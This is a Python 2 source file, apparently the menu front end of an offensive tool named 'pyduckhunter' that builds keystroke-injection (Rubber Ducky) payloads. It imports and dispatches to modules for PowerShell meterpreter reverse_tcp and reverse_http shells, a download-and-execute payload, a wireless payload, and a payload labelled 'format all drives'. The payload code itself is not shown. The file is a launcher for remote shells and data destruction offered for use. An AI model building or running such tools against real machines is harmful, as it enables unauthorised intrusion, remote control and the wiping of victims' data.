#!/usr/bin/python env
#-*-coding:utf-8-*-
import os,sys
sys.dont_write_bytecode = True
from moudles import demo
from moudles import Powershell_Excute_reverse_tcp
from moudles import Powershell_Excute_reverse_http
from moudles import Powershell_Excute_formatall_drievs
from moudles import Powershell_Download_Excute
from moudles import wireless_payload
def payload_console():
    print '''1. Payload for Powershell'''
    choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
    ################################powershell_payload################################################
    if choise == "1":
        print """\n1. Powershell Excute\n
            \n2. Powershell Download and Excute\n
            """
        choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
        if choise == "1":
            print """\n1. windows/meterpreter/reverse_tcp\n
\n2. windows/meterpreter/reverse_http\n
\n3. format_all_drives(warning!)\n
                """
            choise = raw_input("[\033[1;32;1mpyduckhunter>\033[0m]")
            if choise == "1":
                Powershell_Excute_reverse_tcp.Excute()  #########powershell_excute_reverse_tcp
            elif choise == "2":
                Powershell_Excute_reverse_http.Excute() #########powershell_excute_reverse_http
            elif choise == "3":
                Powershell_Excute_formatall_drievs.Excute() #########powershell_excute_Format_all
        elif choise == "2":
            Powershell_Download_Excute.Excute() #########powershell_Dwonload_and_Excute
        ########################powershell_payload################################################